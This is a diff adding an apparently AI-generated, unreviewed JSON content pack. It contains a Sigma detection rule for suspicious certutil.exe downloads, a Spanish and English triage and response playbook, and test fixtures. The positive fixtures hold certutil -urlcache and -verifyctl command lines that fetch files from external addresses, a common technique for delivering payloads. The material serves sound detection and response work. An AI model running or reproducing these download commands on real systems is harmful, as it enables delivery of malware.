@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "19b08b1c-861d-4e75-a1ef-ea0c1baf202b",
+    "title": "Suspicious Download Via Certutil.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_certutil_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_certutil_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó certutil.exe con una opción que permite descargar archivos (urlcache, verifyctl o URL) y una dirección http/https en la línea de comandos. Es una técnica común para traer payloads usando un binario firmado por Microsoft.",
+      "what_it_detects": "Procesos cuyo Image termina en \\certutil.exe u OriginalFileName es CertUtil.exe, cuyo CommandLine contiene 'urlcache ', 'verifyctl ' o 'URL ' y además la cadena 'http'.",
+      "why_it_matters": "Los atacantes usan certutil como LOLBin para descargar herramientas o malware desde servidores externos (Ingress Tool Transfer, T1105), a menudo para evadir controles que bloquean navegadores o PowerShell. También se relaciona con ofuscación de archivos (T1027), porque certutil puede decodificar contenido descargado.",
+      "triage_steps": [
+        "Revise CommandLine completo: extraiga la URL, el dominio o IP de destino y la ruta local donde se guarda el archivo.",
+        "Revise ParentImage y la cadena de procesos: Office, wscript, mshta, cmd lanzado desde un documento o un servicio web son señales fuertes de compromiso.",
+        "Verifique el usuario y el host: ¿es un administrador o una cuenta de servicio con motivo para usar certutil?",
+        "Consulte la reputación de la URL, el dominio y la IP; busque el mismo destino en logs de proxy, DNS y firewall de toda la organización.",
+        "Ubique el archivo descargado, calcule su hash y analícelo; revise si luego se ejecutó o se decodificó con certutil -decode.",
+        "Pivotee en el mismo host +/- 15 minutos: procesos hijos, conexiones de red, archivos creados y cambios de persistencia.",
+        "Busque alertas previas para el mismo host, usuario o URL, y ejecuciones de un certutil renombrado (OriginalFileName distinto de Image)."
+      ],
+      "false_positives": [
+        "Scripts de administración o despliegue que descargan certificados, CRL o archivos internos con certutil -urlcache.",
+        "Herramientas de TI o instaladores legítimos que usan certutil para obtener archivos de un servidor interno conocido.",
+        "Pruebas de red team o validaciones de controles autorizadas y documentadas."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del host o del script si la ejecución es esperada; documente la evidencia antes de actuar.",
+        "Si no está justificada, aísle el endpoint y bloquee la URL, el dominio y la IP en proxy y firewall.",
+        "Ponga en cuarentena el archivo descargado tras preservar una copia y su hash para análisis.",
+        "Elimine persistencia y artefactos relacionados; restablezca credenciales del usuario si hay indicios de robo.",
+        "Limpie la caché de certutil (urlcache) y monitoree el host y el hash en el resto del entorno."
+      ],
+      "severity_rationale": "Nivel medio porque descargar archivos con certutil es poco común en uso legítimo y suele indicar entrega de payloads, aunque algunos scripts administrativos lo hacen."
+    },
+    "en": {
+      "summary": "certutil.exe ran with a download-capable option (urlcache, verifyctl or URL) and an http/https address on the command line. This is a common way to fetch payloads with a Microsoft-signed binary.",
+      "what_it_detects": "Processes whose Image ends with \\certutil.exe or whose OriginalFileName is CertUtil.exe, with a CommandLine containing 'urlcache ', 'verifyctl ' or 'URL ' plus the string 'http'.",
+      "why_it_matters": "Attackers abuse certutil as a LOLBin to pull tools or malware from external servers (Ingress Tool Transfer, T1105), often to bypass controls on browsers or PowerShell. It also ties to obfuscated files (T1027), since certutil can decode downloaded content.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the URL, destination domain or IP, and the local output path.",
+        "Check ParentImage and the process tree: Office, wscript, mshta, or cmd spawned from a document or web service strongly suggests compromise.",
+        "Check the user and host: is this an admin or service account with a reason to run certutil?",
+        "Look up URL, domain and IP reputation; search proxy, DNS and firewall logs organization-wide for the same destination.",
+        "Locate the downloaded file, hash it and analyze it; check whether it was executed or decoded with certutil -decode.",
+        "Pivot on the same host +/- 15 minutes: child processes, network connections, created files and persistence changes.",
+        "Search earlier alerts for the same host, user or URL, and for renamed certutil (OriginalFileName differs from Image)."
+      ],
+      "false_positives": [
+        "Admin or deployment scripts that fetch certificates, CRLs or internal files with certutil -urlcache.",
+        "Legitimate IT tools or installers using certutil to retrieve files from a known internal server.",
+        "Authorized, documented red team exercises or control validation tests."
+      ],
+      "response_steps": [
+        "Confirm with the host or script owner whether the execution was expected; preserve evidence first.",
+        "If unjustified, isolate the endpoint and block the URL, domain and IP at proxy and firewall.",
+        "Quarantine the downloaded file after preserving a copy and its hash for analysis.",
+        "Remove related persistence and artifacts; reset the user's credentials if theft is suspected.",
+        "Clear the certutil URL cache and monitor the host and hash across the environment."
+      ],
+      "severity_rationale": "Medium because certutil downloads are rare in legitimate use and usually indicate payload delivery, though some admin scripts do it."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "certutil spawned by cmd from Word downloads a file via -urlcache from an external IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.23/update.txt C:\\Users\\Public\\update.txt",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://198.51.100.23/update.txt C:\\Users\\Public\\update.txt",
+          "CurrentDirectory": "C:\\Users\\jperez\\Documents\\"
+        }
+      },
+      {
+        "description": "Renamed certutil (matched by OriginalFileName) using -verifyctl with an https URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-07.andes.example.com",
+          "User": "ANDES\\svc_web",
+          "Image": "C:\\ProgramData\\cu.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "cu.exe -verifyctl -f -split https://files.example.org/tools/agent.bin",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\ProgramData\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "certutil clearing its URL cache: contains 'urlcache ' but no http address",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\admin_it",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache * delete",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "certutil computing a file hash: no download flag and no http",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0201.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -hashfile C:\\Users\\mrojas\\Downloads\\setup.msi SHA256",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
